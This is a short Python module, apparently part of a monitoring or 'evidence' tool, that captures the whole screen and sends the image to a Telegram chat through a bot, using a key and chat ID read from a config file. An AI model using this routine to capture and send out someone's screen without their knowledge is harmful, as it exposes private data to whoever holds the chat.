import telebot, os, tempfile
from PIL import ImageGrab
from . import configHandler as config

def sendEvidence():
    # Obtener datos del configurador.
    configPaths = config.getConfigPath()
    config_file = configPaths[2]
    temp_directory = configPaths[1] + '\\screenshots\\'
    configValues = config.getConfigValues(config_file)

    # Crear directorio de screenshots
    os.makedirs(temp_directory, exist_ok=True)  

    config_api_key = configValues[0]
    config_chat_id = configValues[1]

    # Iniciar bot
    bot = telebot.TeleBot(config_api_key)

    # Captura de pantalla
    screenshot = ImageGrab.grab()

    # Generar un nombre temporal para la captura
    temp_file_name = f"ss_{os.urandom(4).hex()}.png"  # Genera un nombre único
    screenshot_file = os.path.join(temp_directory, temp_file_name)

    # Guarda la captura en el directorio temporal
    screenshot.save(screenshot_file)

    # Envía la captura al chat
    with open(screenshot_file, 'rb') as photo:
        bot.send_photo(config_chat_id, photo)

    # Elimina la captura después de enviarla
    #os.remove(screenshot_file)